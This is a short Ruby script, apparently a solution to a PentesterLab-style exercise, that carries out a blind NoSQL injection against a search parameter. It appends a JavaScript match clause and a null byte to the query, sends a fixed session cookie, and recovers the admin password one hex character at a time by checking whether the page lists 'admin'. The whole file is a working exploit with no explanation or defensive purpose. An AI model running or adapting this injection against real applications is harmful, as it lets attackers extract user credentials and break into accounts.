require 'net/http'
require 'cgi'

URL = 'http://ptl-4c029fe6-d5ca690b.libcurl.so/?search='
RANGE = ('a'..'f').to_a + ('0'..'9').to_a
EXPECTED_FORMAT = 'XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX'

# Request (GET )
def send_request(substring)
  escaped_params = CGI.escape("admin' && this.password && this.password.match(/^#{substring}.*$/)")
  url = URL + escaped_params + "%00"

  uri = URI(url)

  http = Net::HTTP.new(uri.host, uri.port)
  req =  Net::HTTP::Get.new(uri)
  req.add_field "Cookie", "rack.session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiRTk0MjVjODU5ZDUxZjczNjJjMzFi%0AZDBjYTFhYjUzZDdiN2RkN2EzZjc4ZjQzNWQ3ZmEwOGRkNGNjZmY2NTAzZTQG%0AOwBGSSIJY3NyZgY7AEZJIiVmMTg5MzZmNmNhNzgxZTdiY2UzYzljOTE3MjQx%0AOTgxMQY7AEZJIg10cmFja2luZwY7AEZ7B0kiFEhUVFBfVVNFUl9BR0VOVAY7%0AAFRJIi0yOTRmODkwNTFlZjVlZmFlNDY5NzRkYjBmODEzZTk3YWYwMTI2NTQ1%0ABjsARkkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsAVEkiLWRhMzlhM2VlNWU2%0AYjRiMGQzMjU1YmZlZjk1NjAxODkwYWZkODA3MDkGOwBG%0A--d527b0a634f7af80d8f589b6ee19ff1352538343"

  res = http.request(req)
  res.body =~ %r{>admin</a>}
end

def find_password(current_known_password: '')
  return current_known_password if current_known_password.size == EXPECTED_FORMAT.size
  next_character = fetch_next_character(current_known_password)
  find_password(current_known_password: current_known_password + next_character)
end

def fetch_next_character(current_known_password)
  next_character = RANGE.find { |tentative_char| send_request(current_known_password + tentative_char) }
  next_character ? next_character : '-'
end

puts find_password
